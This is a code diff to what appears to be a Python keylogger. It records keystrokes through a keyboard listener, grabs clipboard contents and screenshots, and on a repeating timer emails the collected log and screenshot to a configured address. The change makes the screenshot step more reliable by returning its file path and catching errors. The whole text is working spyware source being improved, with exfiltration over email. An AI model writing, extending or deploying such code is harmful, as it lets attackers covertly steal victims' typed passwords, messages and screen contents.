@@ -84,8 +84,8 @@ finally:
 
         def report(self):
             self.appendlog("\nClipboard content: " + pyperclip.paste() + "\n")
-            self.screenshot()
-            self.send_mail(self.email, self.password, "\n\n" + self.log, "screenshot.png")
+            screenshot_path = self.screenshot()
+            self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_path)
             self.log = ""
             timer = threading.Timer(self.interval, self.report)
             timer.start()
@@ -116,8 +116,14 @@ finally:
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
         def screenshot(self):
-            img = pyscreenshot.grab()
-            img.save("screenshot.png")
+            try:
+                img = pyscreenshot.grab()
+                screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
+                img.save(screenshot_path)
+                return screenshot_path
+            except Exception as e:
+                self.appendlog("Failed to take screenshot: {}\n".format(e))
+                return None
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
